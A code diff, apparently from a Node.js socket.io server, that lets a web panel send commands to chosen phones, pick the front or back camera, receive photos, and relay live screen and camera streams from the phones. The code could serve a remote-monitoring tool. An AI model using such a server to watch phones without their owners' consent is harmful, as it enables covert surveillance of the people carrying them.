@@ -24,10 +24,13 @@ io.on('connection', (socket) => {
         io.emit('update_devices', Array.from(connectedDevices.values()));
     });
 
-    // Enviar comando dirigido a un celular específico desde el panel web
+    // Enviar comando dirigido a un celular específico desde el panel web (incluyendo parámetros extra como la lente)
     socket.on('send_command_to_device', (data) => {
         console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
-        io.to(data.targetId).emit('command_to_phone', { action: data.action });
+        io.to(data.targetId).emit('command_to_phone', { 
+            action: data.action, 
+            lens: data.lens || 'back' 
+        });
     });
 
     // Recibir la respuesta del celular (ej. la foto) y mandarla a la web
@@ -36,9 +39,14 @@ io.on('connection', (socket) => {
         io.emit('phone_response', { ...response, deviceId: socket.id });
     });
 
-    // Transmisión de pantalla en tiempo real (ahora incluye el ID del celular que emite)
+    // Transmisión de pantalla en tiempo real
     socket.on('screen_frame', (base64Frame) => {
         io.emit('screen_frame', { deviceId: socket.id, frame: base64Frame });
+    });
+
+    // Transmisión de cámara en tiempo real
+    socket.on('camera_frame', (base64Frame) => {
+        io.emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
     });
 
     socket.on('disconnect', () => {
